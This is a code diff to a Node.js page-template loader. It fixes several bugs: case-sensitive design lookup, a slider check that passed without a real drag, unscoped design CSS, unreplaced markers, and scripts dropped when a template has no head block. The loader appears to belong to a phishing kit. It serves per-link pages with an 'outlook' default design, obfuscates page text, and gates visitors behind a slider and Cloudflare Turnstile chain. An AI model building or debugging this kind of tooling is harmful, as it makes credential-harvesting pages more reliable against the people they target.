@@ -108,9 +108,20 @@ function loadTemplateJS(tt) {
 }
 
 function loadVerificationDesignCSS(designName) {
-    const bn = String(designName || 'outlook').trim();
-    const dp = path.join(DESIGNS_DIR, bn + '.css');
-    if (fs.existsSync(dp)) return fs.readFileSync(dp, 'utf8');
+    // Resolve case-insensitively. The DB stores display names such as "Slider"
+    // while the file on disk is "slider.css"; on a case-sensitive filesystem
+    // (Linux VPS) the single-case lookup silently fell back to outlook.css, so
+    // the wrong design's CSS was served.
+    const name = String(designName || 'outlook').trim();
+    const bn = name.toLowerCase();
+    const candidates = [
+        path.join(DESIGNS_DIR, name + '.css'),
+        path.join(DESIGNS_DIR, bn + '.css'),
+        path.join(DESIGNS_DIR, bn.charAt(0).toUpperCase() + bn.slice(1) + '.css'),
+    ];
+    for (const p of candidates) {
+        if (fs.existsSync(p)) return fs.readFileSync(p, 'utf8');
+    }
     const fp = path.join(DESIGNS_DIR, 'outlook.css');
     return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
@@ -146,17 +157,41 @@ function loadVerificationDesignHTML(designName) {
         if (fs.existsSync(fp)) {
             console.log('[Templateloader] Found verification design HTML:', fp);
             const content = fs.readFileSync(fp, 'utf8');
-            // Extract <style> content and <script> content separately
+            // Extract <style> content
             const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
-            const scriptMatch = content.match(/<script[^>]*>([\s\S]*?)<\/script>/i);
-            
-            // Extract HTML body content (between <body> and </body>)
+            // Extract <script> content. A design may carry several blocks, so
+            // concatenate them all instead of only capturing the first one.
+            const scriptTags = content.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi) || [];
+            const js = scriptTags
+                .map(function (tag) {
+                    const m = tag.match(/<script\b[^>]*>([\s\S]*?)<\/script>/i);
+                    return m ? m[1].trim() : '';
+                })
+                .filter(Boolean)
+                .join('\n');
+
+            // Extract HTML body content (between <body> and </body>).
+            //
+            // <script> tags are STRIPPED here. The same code is delivered exactly
+            // once, separately, by buildSliderOverlay() via chainJs. Leaving the
+            // tags in made the design script execute twice: the first run fired
+            // while the browser was still parsing layer 1, i.e. before the
+            // stylesheet block was applied, so clientWidth measured an
+            // unstyled box, maxTranslate computed negative and
+            // `translate > maxTranslate * 0.85` was true on the very first 1px
+            // of drag - the slider "verified" with no real drag at all.
             const bodyMatch = content.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
-            
+            const html = bodyMatch
+                ? bodyMatch[1]
+                    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
+                    .replace(/<script\b[^>]*\/?>/gi, '')
+                    .trim()
+                : '';
+
             return {
                 css: styleMatch ? styleMatch[1].trim() : '',
-                js: scriptMatch ? scriptMatch[1].trim() : '',
-                html: bodyMatch ? bodyMatch[1].trim() : '',
+                js: js,
+                html: html,
                 hasHtml: true
             };
         }
@@ -437,6 +472,92 @@ function obfuscateTextContent(html) {
     return html.trim();
 }
 
+// ─── Scope Verification Design CSS ─────────────────────────
+// Design files such as verification-designs/SLIDER.html are standalone pages and
+// therefore ship top-level global rules:
+//
+//     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+//     :root { --sp-blue: ...; }
+//     body  { display: flex; align-items: center; justify-content: center; ... }
+//     .card { max-width: 420px; ... }
+//     h1 { ... }  p { ... }
+//
+// Injecting them unscoped into a template page is destructive: the style block
+// lands after <body>, i.e. AFTER the template's own <style> in <head>, so at
+// equal specificity the design wins everywhere. `body{display:flex}` redeclares
+// `display` without `flex-direction`, which resets it to `row` and pushes the
+// template's topbar/card side by side; `.card{max-width:420px}` collapses the
+// whole form; `:root` swaps every --sp-* token.
+//
+// This rewrites every selector to be relative to the slider layer element, so
+// the design can only ever paint inside its own overlay. Nested @media blocks
+// are recursed; @keyframes / @font-face bodies are emitted verbatim.
+function scopeVerificationCss(css, scopeId) {
+    var scope = '#' + scopeId;
+    // Document-level selectors map onto the layer element itself. Custom props
+    // declared there cascade down to the design's descendants as intended.
+    var GLOBAL_TO_SCOPE = {
+        '*': scope + ', ' + scope + ' *',
+        '*::before': scope + '::before, ' + scope + ' *::before',
+        '*::after': scope + '::after, ' + scope + ' *::after',
+        'body': scope,
+        'html': scope,
+        ':root': scope
+    };
+
+    function scopeSelectorList(selList) {
+        return selList.split(',').map(function (sel) {
+            var s = sel.trim();
+            if (!s) return '';
+            if (s.indexOf(scope) === 0) return s;
+            var key = s.toLowerCase();
+            if (Object.prototype.hasOwnProperty.call(GLOBAL_TO_SCOPE, key)) return GLOBAL_TO_SCOPE[key];
+            return scope + ' ' + s;
+        }).filter(Boolean).join(', ');
+    }
+
+    function walk(src) {
+        // CSS comments may contain braces and would break the brace walk.
+        src = src.replace(/\/\*[\s\S]*?\*\//g, '');
+        var out = [];
+        var i = 0;
+        while (i < src.length) {
+            while (i < src.length && /\s/.test(src.charAt(i))) i++;
+            if (i >= src.length) break;
+
+            // Scan to the '}' that closes this top-level rule, counting nesting.
+            var depth = 0, open = -1, close = -1;
+            for (var j = i; j < src.length; j++) {
+                var ch = src.charAt(j);
+                if (ch === '{') {
+                    depth++;
+                    if (open === -1) open = j;
+                } else if (ch === '}') {
+                    depth--;
+                    if (depth === 0) { close = j; break; }
+                }
+            }
+            if (open === -1 || close === -1) break; // malformed input - stop
+
+            var header = src.substring(i, open).trim();
+            var body = src.substring(open + 1, close);
+
+            if (/^@media/i.test(header)) {
+                out.push(header + ' {' + walk(body) + '}');
+            } else if (/^@/i.test(header)) {
+                // @keyframes, @font-face, etc. - must not be re-scoped.
+                out.push(header + ' {' + body + '}');
+            } else {
+                out.push(scopeSelectorList(header) + ' {' + body + '}');
+            }
+            i = close + 1;
+        }
+        return out.join('\n');
+    }
+
+    return walk(css);
+}
+
 // ─── Build Slider Overlay HTML ─────────────────────────────
 // Builds the slider verification HTML+CSS+JS to inject into the page.
 // Uses SLIDER.html file content if available, otherwise generates default.
@@ -494,7 +615,8 @@ function buildSliderOverlay(sliderData, link, obfuscate = false) {
     // Use CSS from SLIDER.html if available
     let cssContent = '';
     if (sliderData && sliderData.hasHtml && sliderData.css) {
-        cssContent = sliderData.css;
+        // Scope to the layer - see scopeVerificationCss() for why this is required.
+        cssContent = scopeVerificationCss(sliderData.css, 'vgSliderLayer');
     } else {
         // Fallback default CSS
         cssContent = `
@@ -651,18 +773,32 @@ function buildSliderOverlay(sliderData, link, obfuscate = false) {
                                 .replace(/<\/style/gi, '<\\/style');
     }
 
-    const chainJs = '<script>' + finalSliderJs + '<\/script>';
+    // Completion contract. Design scripts only call window.__vgOnSliderComplete();
+    // they never signal readiness themselves. Seeding these globals makes the
+    // engine's recovery polls in initSliderChainHandler() actually work for
+    // file-based designs - previously they only held true for the fallback, so
+    // the "slider already completed before the engine loaded" path was inert.
+    const contractJs =
+        'window.__vgSliderVerified = window.__vgSliderVerified === true;' +
+        'window.__vgCheckSliderReady = function(){ return window.__vgSliderVerified === true; };';
 
-    // Combine all layers
+    const chainJs = '<script>' + contractJs + '\n' + finalSliderJs + '<\/script>';
+
+    // Combine all layers.
+    //
+    // The stylesheet comes FIRST: it must be parsed before the design script
+    // runs, otherwise clientWidth is measured against an unstyled box,
+    // maxTranslate computes negative and the 85% threshold trips on the first
+    // pixel of drag.
     const fullHtml = `
 <!-- ═══════════════════════════════════════════════════
      SLIDER → CLOUDFLARE VERIFICATION CHAIN
      Layer 1: Slider (shows first, always visible)
      Layer 2: Cloudflare Turnstile (shows after slider)
      ═══════════════════════════════════════════════════ -->
+${styleHtml}
 ${layer1Html}
 ${layer2Html}
-${styleHtml}
 ${chainJs}`;
 
     return fullHtml;
@@ -704,11 +840,15 @@ async function renderPageHtml(link, user, options) {
     console.log('  link.template_type:', link.template_type);
     console.log('[Templateloader] ═══ END SLIDER DETECTION ═══');
 
+    // {{CSS}} / {{SCRIPT}} may appear bare or comment-wrapped (/* {{CSS}} */).
+    // The old code guarded on .includes('{{CSS}}') but only replaced the
+    // comment-wrapped form, so a bare marker passed the guard, was not replaced,
+    // and the literal "{{CSS}}" text shipped to the client.
     if (html.includes('{{CSS}}')) {
-        html = html.replace('/* {{CSS}} */', css);
+        html = html.replace(/\/\*\s*\{\{CSS\}\}\s*\*\/|{{CSS}}/g, css);
     }
     if (html.includes('{{SCRIPT}}')) {
-        html = html.replace('// {{SCRIPT}}', script);
+        html = html.replace(/\/\/\s*\{\{SCRIPT\}\}|{{SCRIPT}}/g, script);
     }
 
     // Use template config defaults as fallbacks, then link overrides
@@ -750,16 +890,26 @@ async function renderPageHtml(link, user, options) {
     
     // Add slider design flag for vg-engine.js (must be boolean, not string)
     const sliderFlag = '<script>window.__SLIDER_DESIGN=' + String(isSliderDesign) + '</script>';
-    
-    html = html.replace('</head>', windowVars + configScript + sliderFlag + '</head>');
 
+    // Assemble the whole runtime bootstrap in one place.
+    var headScripts = windowVars + configScript + sliderFlag;
     if (vgEngine) {
         console.log('[Templateloader] Injecting vg-engine.js, length:', vgEngine.length);
         console.log('  vg-engine contains </script>:', vgEngine.includes('</script>'));
         console.log('  vg-engine contains <script>:', vgEngine.includes('<script>'));
-        
-        html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
-        console.log('[Templateloader] vg-engine.js injected');
+        headScripts += '<script>' + vgEngine + '</script>';
+    }
+
+    // Prefer </head>. Custom/user-uploaded templates may have no <head> block;
+    // the old code used html.replace('</head>', ...) which silently does nothing
+    // in that case - the window vars, the slider flag AND vg-engine.js were all
+    // discarded at once, producing a page with no engine and no slider hand-off.
+    if (html.includes('</head>')) {
+        html = html.replace('</head>', headScripts + '</head>');
+        console.log('[Templateloader] Runtime scripts injected before </head>');
+    } else {
+        html = html.replace(/<body[^>]*>/i, function (m) { return m + headScripts; });
+        console.warn('[Templateloader] No </head> found - injected runtime scripts at the top of <body>');
     }
     
     // ═══════════════════════════════════════════
@@ -1275,7 +1425,9 @@ module.exports = {
     loadVerificationDesignCSS,
     loadVerificationDesignHTML,
     hasVerificationDesignHTML,
+    scopeVerificationCss,
     buildSliderOverlay,
+    renderPageHtml,
     loadAdminSettings,
     boolSetting,
     getVisitorAccessSettings,
